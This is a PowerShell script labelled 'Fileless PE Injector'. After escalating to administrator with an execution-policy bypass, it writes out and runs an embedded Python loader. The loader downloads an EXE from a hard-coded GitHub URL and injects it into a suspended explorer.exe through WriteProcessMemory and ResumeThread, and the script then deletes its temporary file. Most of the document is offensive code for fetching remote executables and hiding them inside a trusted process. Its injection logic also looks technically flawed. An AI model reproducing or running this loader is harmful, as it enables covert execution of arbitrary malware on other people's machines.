# Fileless PE Injector - PowerShell Version
Write-Host "=== Fileless PE Injector ===" -ForegroundColor Cyan
Write-Host "This tool injects GUI EXEs into processes from memory" -ForegroundColor Yellow

# Check for admin rights
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    $command = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $command
    exit
}

Write-Host "[✓] Running as Administrator" -ForegroundColor Green

# Download and execute Python injector
$pythonCode = @'
import ctypes, struct, urllib.request, sys

# Windows API
k32 = ctypes.WinDLL("kernel32")

def inject(pe_url, target="explorer.exe"):
    # Download PE
    try:
        req = urllib.request.Request(pe_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as r:
            pe_data = bytearray(r.read())
    except:
        print("Download failed")
        return False
    
    if len(pe_data) < 100 or pe_data[0:2] != b'MZ':
        print("Invalid PE")
        return False
    
    # Parse PE
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    
    # Create suspended process
    CREATE_SUSPENDED = 0x4
    si = ctypes.c_void_p()
    pi = ctypes.c_void_p()
    
    if not k32.CreateProcessW(None, target, None, None, False,
                             CREATE_SUSPENDED, None, None,
                             ctypes.byref(si), ctypes.byref(pi)):
        print("CreateProcess failed")
        return False
    
    # Allocate memory
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_READWRITE = 0x04
    alloc = k32.VirtualAllocEx(pi, 0, image_size,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    
    if not alloc:
        k32.CloseHandle(pi)
        return False
    
    # Write PE
    written = ctypes.c_size_t(0)
    header_size = pe_offset + 248
    k32.WriteProcessMemory(pi, alloc, pe_data, header_size,
                          ctypes.byref(written))
    
    # Write sections
    num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
    section_table = pe_offset + 248
    
    for i in range(num_sections):
        sec = section_table + (i * 40)
        if sec + 40 > len(pe_data):
            break
        
        va = struct.unpack('<I', pe_data[sec+12:sec+16])[0]
        raw_size = struct.unpack('<I', pe_data[sec+16:sec+20])[0]
        raw_offset = struct.unpack('<I', pe_data[sec+20:sec+24])[0]
        
        if raw_size > 0:
            section = pe_data[raw_offset:raw_offset + raw_size]
            k32.WriteProcessMemory(pi, alloc + va, section,
                                  raw_size, ctypes.byref(written))
    
    # Resume and cleanup
    k32.ResumeThread(pi)
    k32.CloseHandle(pi)
    return True

# Usage
if __name__ == "__main__":
    print("PE Injector Ready")
    # Use your URL here
    url = "https://github.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/raw/main/RhAS8@nga/rCTnJexpp1.exe"
    if inject(url, "explorer.exe"):
        print("Success! GUI should appear.")
    else:
        print("Failed")
'@

# Simple menu
Write-Host "`n[1] Use default EXE (from your GitHub)"
Write-Host "[2] Enter custom EXE URL"
Write-Host "[3] Exit`n"

$choice = Read-Host "Select option (1-3)"

if ($choice -eq "3") { exit }

if ($choice -eq "1") {
    $peUrl = "https://github.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/raw/main/RhAS8@nga/rCTnJexpp1.exe"
} else {
    $peUrl = Read-Host "Enter EXE URL"
}

$target = Read-Host "Enter target process (default: explorer.exe)"
if (-not $target) { $target = "explorer.exe" }

Write-Host "`nStarting injection..." -ForegroundColor Green
Write-Host "EXE URL: $peUrl"
Write-Host "Target: $target`n"

# Execute Python
$tempFile = "$env:TEMP\injector_$(Get-Random).py"
$pythonCode.Replace('https://github.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/raw/main/RhAS8@nga/rCTnJexpp1.exe', $peUrl) | Out-File $tempFile -Encoding UTF8

# Run Python
if (Get-Command python -ErrorAction SilentlyContinue) {
    python $tempFile
} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $tempFile
} else {
    Write-Host "Python not found. Downloading embedded Python..." -ForegroundColor Yellow
    
    # Download Python
    $pythonZip = "$env:TEMP\python_embed.zip"
    $pythonDir = "$env:TEMP\python_embed"
    $pythonExe = "$pythonDir\python.exe"
    
    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip" -OutFile $pythonZip
    Expand-Archive -Path $pythonZip -DestinationPath $pythonDir -Force
    & $pythonExe $tempFile
}

# Cleanup
Remove-Item $tempFile -ErrorAction SilentlyContinue
Write-Host "`nDone. Press any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
